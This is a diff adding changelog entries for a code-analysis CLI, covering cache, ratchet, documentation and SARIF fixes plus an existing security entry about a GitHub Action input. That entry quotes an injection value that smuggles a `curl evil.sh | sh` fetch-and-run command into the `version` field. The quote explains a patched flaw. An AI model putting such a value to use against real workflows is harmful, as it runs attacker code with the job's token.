@@ -4,6 +4,29 @@ Conventional Commits format. All notable changes documented here.
 
 ## [Unreleased]
 
+### Fixed
+
+- **A head-only ingest now persists its cache entry.** The blind-ingest guard asked whether any commits were ingested — but a head-only ingest walks no commits by design, so that test was true on every healthy run: the store just written to disk was discarded and the expensive HEAD complexity scan re-run into memory. `codelore calibrate` takes this path once per corpus repository, so it paid the scan twice per repo and could never persist an entry to reuse on the next run. The witness now matches the ingest mode, testing the table the head-only scan actually fills. The full-ingest path is unchanged, and the guard that refuses to persist a truly blind ingest still holds.
+
+- **`check --ratchet` no longer records a code-health floor for a gate you never configured.** The ratchet is documented as tracking a metric only when its matching gate is configured — true of the effort and cycles metrics, which read ledger records that exist only if their gate ran. Code health was read straight off the scan, which runs unconditionally because other gates consume its rows, so a run with no `code_health_min` in the thresholds file still recorded a baseline. A later benign refactor that moved the worst file's score by recomputation noise then failed the run against a bound the user never set.
+
+
+### Fixed
+
+- **The zero-row notice no longer prescribes a remedy that most analyses cannot use.** It closed by suggesting `--min-revs 1`, but `min_revs` is a genuine filter in only 17 of the analysis modules — 23 more name it solely in a tracing span and 23 never mention it. On `defect-validation` the effect was self-contradictory: the analysis printed the correct instruction to build a calibration artifact, and the notice immediately advised lowering a threshold it does not read. The notice now states the analysis, the zero, and the options that were set, and stops. The options summary still carries `min-revs=<n>`, so where it *is* the cause the number sits beside the zero; §12 of the advanced-usage guide covers the header-only case explicitly.
+
+- **The README's "Tracking health over time" gate example now includes `max_red_effort_pct`,** the third key `check` recommends when no thresholds are configured. It was the only one of the three absent from the README, and the subtlest — churn share landing in red-band files, counted against health-scored churn only, with health-improving churn exempt — so it was the one a reader could not look up where the CLI had just sent them.
+
+- **"Your first 5 minutes" now points at the next section before the reference guide.** It handed off to the 1,700-line advanced guide four lines above the section written to answer the question a reader has at that moment.
+
+- **`check --format sarif` no longer anchors an alert to a file that does not exist.** When `fail_on_skipped` promotes a skipped gate to a violation it carries the sentinel path `(skipped)`, but the SARIF emitter normalised only two of the three gate sentinels to the repository root — the third was minted later and never registered — so the alert pointed at a phantom `(skipped)` file. The exit code was always right; the published alert was not. The check now covers the whole sentinel set, guarded by a test that iterates every one of them so a fourth fails until it is handled.
+
+- **The `--fail-on` documentation now states the exit code the binary actually uses.** `diff` gate violations moved to exit 1 in 0.26.0, matching `check` and `gate`, but two lines still prescribed exit 4 — while the same document defines 4 as "analysis error" and states gate violations exit 1. A CI script written from those lines (`if [ $? -eq 4 ]`) has been silently disarmed since that release: the branch never fires and the violating PR merges green.
+
+- **Cache remediation messages no longer prescribe a flag the calling surface lacks.** Three strings — the schema-version mismatch and both dirty-worktree notices — told the reader to pass `--no-cache`, which exists only on `analyze`. The schema mismatch is the sharp one: it is a hard failure reachable from `check` in CI whose only stated remedy is a flag `check` rejects. All three now name `--cache-dir <scratch>` and mark `--no-cache` as analyze-only.
+
+- **Two Action-guide examples that cannot run.** The SARIF matrix included `knowledge-islands`, which has no SARIF rule, so that leg exited 2 on every run while the guide presented it as a working pattern; it is replaced with `clones`. And `check --format json` was offered as the machine-readable option, but `check` accepts `text | sarif` — `json` is a `gate` format, so the documented command failed at parse time.
+
 ### Security
 
 - **The Action's `version` input can no longer reach a shell.** Inputs were routed through the environment so a crafted value could not break out of the script it was read in — but `version` also becomes a step output, and the install step consumed that output with `${{ }}`, which splices into the script text at render time. A value like `v1.0"; curl evil.sh | sh; "` therefore executed in the job with the workflow's token, one hop past the protection, while the file's comments asserted the surface was closed. The resolve step now rejects anything that is not a `vX.Y.Z` tag before writing the output, and the install step reads its step outputs through the environment as well — two independent barriers. CI gained a step that passes a crafted version and fails the build unless it is rejected *and* no command ran; the existing Action smoke test only ever exercised the happy path, which is how the gap shipped.
